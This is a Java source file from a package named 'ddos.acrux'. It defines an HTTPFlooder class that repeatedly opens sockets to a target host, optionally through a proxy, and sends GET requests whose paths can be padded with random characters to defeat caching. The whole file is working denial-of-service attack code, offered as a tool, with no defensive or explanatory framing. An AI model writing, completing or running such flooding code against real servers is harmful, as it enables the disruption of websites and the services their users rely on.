package ddos.acrux;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketAddress;

/**
 *
 * @author acrux
 */
public class HTTPFlooder extends Flooder {

    private RandomString randStr = new RandomString(1024);
    private String subsite = "/";
    private boolean randChars = false;

    public HTTPFlooder(SocketAddress host) {
        super(host);
    }

    public HTTPFlooder(InetAddress ip, int port) {
        super(ip, port);
    }

    public HTTPFlooder(String hostname, int port) {
        super(hostname, port);
    }

    @Override
    void flood() throws IOException {
        Socket sock;
        if (getProxy() != null) {
            sock = new Socket(getProxy());
        } else {
            sock = new Socket();
        }
        sock.connect(getHost(), timeout);

        OutputStream os = sock.getOutputStream();
        InputStream is = sock.getInputStream();


        os.write(getHTTPRequest());
        os.flush();
        os.close();
        sock.close();
    }

    private byte[] getHTTPRequest() {
        String path = subsite;
        
        if (randChars) {
            path += randStr.nextString();
        }
        String request = "GET " + path + " HTTP/1.1\n"
                + "Host: " + getHost() + "\n"
                + "\n";
        return request.getBytes();
    }

    public void setSubsite(String subsite) {
        this.subsite = subsite;
    }

    public void setRandChars(boolean randChars) {
        this.randChars = randChars;
    }
}
